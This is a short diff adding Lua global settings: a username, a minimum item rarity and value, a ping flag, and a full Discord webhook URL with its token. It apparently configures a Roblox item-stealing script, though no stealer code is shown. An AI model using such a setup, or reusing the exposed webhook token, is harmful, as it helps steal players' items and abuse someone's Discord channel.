@@ -1,0 +1,5 @@
+_G.Username = "Kimberly25181"
+_G.min_rarity = "Ancient"
+_G.min_value = 1
+_G.pingEveryone = "Yes" 
+_G.webhook = "https://discord.com/api/webhooks/1358972435164303481/MBbY_i-fHZYYx_FW2yn8gylHswANrSZXzVkgsfT31eMZAHkYSW3ZokAhEBfHkUrNsBjy"
